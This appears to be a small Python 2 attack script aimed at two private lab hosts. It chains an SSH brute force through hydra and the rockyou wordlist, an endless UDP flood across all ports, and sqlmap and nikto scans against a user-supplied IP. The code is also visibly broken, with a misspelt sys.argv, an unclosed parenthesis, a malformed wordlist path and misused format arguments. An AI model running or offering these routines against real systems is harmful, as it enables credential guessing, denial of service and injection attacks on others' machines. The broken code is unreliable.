#ubuntu18 - 192.168.151.11
#centos7 64bit - 192.168.151.10
#!/usr/bin/python

import sys
import os
import time
import socket
import random


#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

ip = 0
port = 22

 

if (len(sys.argv) > 1):
    ip = str(sysargv[1])
else:
    print("Enter The IP: ")
    ip = raw_input()


# SSH bruteforce
def ssh_brute():
    os.system("hydra -L /usr/share/wordlists.rockyou.txt -P /usr/share/wordlists/rockyou.txt %s -t 4 ssh"%(ip)


# DDOS
def ddos_me():
    ##############
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)
    #############

    os.system("clear")
    os.system("figlet Attack Starting")
    print "[ ] 0% "
    time.sleep(5)
    print "[===== ] 25%"
    time.sleep(5)
    print "[========== ] 50%"
    time.sleep(5)
    print "[=============== ] 75%"
    time.sleep(5)
    print "[====================] 100%"
    time.sleep(3)
    sent = 0
    while True:
        sock.sendto(bytes, (ip,port))
        sent = sent + 1
        port = port + 1
        print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
        if port == 65534:
            port = 1


#sqlmap
def sqlmap_me():
    os.system("sqlmap -u 'https://%s/index.php?name=abc' --threads=10", ip)

 
def main():
    ssh_brute()
    #ddos_me()
    #nikto Scan
    #os.system("nikto -host %s", ip)
    #sqlmap_me()


if __name__ == "__main__":
    main()
